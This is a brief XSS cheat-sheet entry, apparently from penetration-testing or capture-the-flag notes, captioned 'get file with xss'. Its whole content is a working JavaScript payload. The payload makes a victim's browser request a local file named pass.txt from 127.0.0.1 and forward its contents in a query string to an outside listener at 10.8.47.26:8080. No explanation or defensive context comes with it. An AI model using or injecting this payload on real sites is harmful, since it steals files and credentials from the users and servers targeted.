# XSS

---------------------------------------------------------------

get file with xss

<script>
const xhr = new XMLHttpRequest();
xhr.open("GET", "http://127.0.0.1/dir/pass.txt");
xhr.send();
xhr.onload = () => {
	const xhrr = new XMLHttpRequest();
    xhrr.open("GET", "http://10.8.47.26:8080/?c="+xhr.response);
    xhrr.send();
	
};
</script>

---------------------------------------------------------------